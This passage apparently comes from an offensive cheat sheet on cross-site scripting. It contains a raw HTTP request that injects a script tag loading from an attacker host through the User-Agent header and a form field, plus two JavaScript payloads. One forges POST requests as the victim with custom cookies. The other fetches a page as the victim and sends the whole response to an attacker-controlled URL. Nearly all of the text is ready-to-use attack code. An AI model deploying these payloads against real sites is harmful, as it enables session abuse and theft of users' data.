POST /blog-single.php HTTP/1.1
Host: <RHOST>
User-Agent: <script src="http://<LHOST>:<LPORT>/test.html"></script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 126
Origin: http://<RHOST>
DNT: 1
Connection: close
Referer: http://<RHOST>/blog.php
Upgrade-Insecure-Requests: 1

name=test&email=test%40test.de&phone=1234567890&message=<script
src="http://<LHOST>:<LPORT>/test.html"></script>&submit=submit
```

### XSS POST Request

#### XSS post request on behalf of the Victim, with custom Cookies.

```c
var xhr = new XMLHttpRequest();
document.cookie = "key=value;";
var uri ="<target_uri>";
xhr = new XMLHttpRequest();
xhr.open("POST", uri, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("<post_body>");
```

### XSS Web Request

#### XSS web Request on behalf of Victim and sends back the complete Webpage.

```c
xmlhttp = new XMLHttpRequest();
xmlhttp.onload = function() {
  x = new XMLHttpRequest();
  x.open("GET", '<local_url>?'+xmlhttp.response);
  x.send(null);
}
xmlhttp.open("GET", '<RHOST>');
xmlhttp.send(null);
```
